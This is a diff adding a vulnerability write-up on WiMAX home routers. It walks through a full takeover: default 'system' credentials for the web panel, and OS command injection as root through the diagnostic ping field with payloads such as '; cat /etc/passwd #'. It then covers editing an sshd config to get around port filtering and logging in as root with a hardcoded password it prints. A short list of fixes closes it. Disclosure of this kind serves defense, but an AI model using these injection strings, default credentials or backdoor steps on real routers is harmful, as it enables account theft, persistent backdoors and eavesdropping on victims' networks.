@@ -1,0 +1,51 @@
+==Risks
+    1-An attacker could steal WiMAX authentication password which lets him to use vicitim's account for free.
+    2-An attacker could setup a persistent backdoor on the router and use it on any time.
+    3-An attacker could attack to local devices on the network.
+    4-An attacker could listen to sensitive data.
+    And lots of other things.
+
+==Objectives
+    1-Enter the web admin panel on the router (Usually on 192.168.0.1)
+    2-Find somewhere to inject OS Commands
+    3-Open an SSH port
+    4-Login in to SSH
+
+=Enter the web admin panel on the router (Usually on 192.168.0.1)
+  In these routers there is a user called 'system' that has the default password 'system', Unfortunately.
+  Also it is common for users to leave the admin user 's password UNCHANGED.
+=Find somewhere to inject OS Commands
+  Usually routers have somewhere for ping & diagnostics so like others you can arrive to "/cgi-bin/diagnostic.cgi".
+  At there you can inject commands which will be executed as root.
+  e.g.: In the IP address input write "0.0.0.0 -c 1; cat /etc/passwd #". This would probably show the passwd file.
+=Open an SSH port
+  As we already have the ability to run commands as root we can do various things, like finding passwords,
+  running services and ... . So to open an SSH port we would just step forward to ssh config files, We run "0.0.0.0 -c 1; find / -name *ssh* #".
+  That would probably result something like above:
+    --- 0.0.0.0 ping statistics ---
+    1 packets transmitted, 1 packets received, 0% packet loss
+    round-trip min/avg/max = 0.0/0.0/0.0 ms
+    /etc/change_ssh_account
+    /etc/sncfg/sshd.cfg
+    /usr/cfg/sshd.cfg
+    /usr/trans/sshd.trans
+    Content-type: text/html
+    ...
+  Lets lookup the files, The first file contains username and password for ssh login, The second and third file contains SSH service's port,
+  which in this case it is 22. As you know the SSH port is FILTERED, How? something specifies the port to filter.
+  There are acctually ebtables and iptables installed so you can port forward the port 22 to an open port either open the port 22.
+  *However there is a more simple way, Just change the port in the file "/etc/sncfg/sshd.cfg" to something else and leave the "/usr/cfg/sshd.cfg" unchanged (And reboot).
+=Login in to SSH
+  We can easily ssh to router with the credentials found in "/etc/change_ssh_account".
+  e.g.: ssh root@192.168.0.1 
+          root@192.168.0.1's password: gjsrtf29
+        # uname -m
+          armv5tejl
+
+
+==How to fix this?
+  -Update the firmware.
+  -Disable the web admin panel.
+  -Change the SSH password to something safer.
+  -Filter useless open ports (There are lots of them.).
+  -Disable Remote management.
